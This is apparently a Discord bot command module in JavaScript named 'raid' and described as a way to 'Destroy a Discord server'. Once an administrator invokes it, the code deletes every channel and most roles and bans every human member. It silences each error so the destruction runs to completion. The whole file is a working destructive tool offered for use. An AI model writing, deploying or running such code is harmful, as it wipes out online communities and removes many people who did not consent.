module.exports = {
    name: 'raid',
    description: 'Destroy a Discord server (requires permissions)',
    execute: async (client, message, args) => {
        if (!message.member.permissions.has('Administrator')) {
            return message.channel.send('❌ You must be administrator to use this command.');
        }

        message.channel.send('Deleting all channels, roles and banning all members...');

        message.guild.channels.cache.forEach(async (channel) => {
            try { await channel.delete(); } catch {} 
        });

        message.guild.roles.cache
            .filter(role => role.name !== '@everyone' && !role.managed)
            .forEach(async (role) => { try { await role.delete(); } catch {} });

        message.guild.members.cache.forEach(async (member) => {
            if (!member.user.bot) { try { await member.ban({ reason: 'Auto raid' }); } catch {} }
        });
    }
};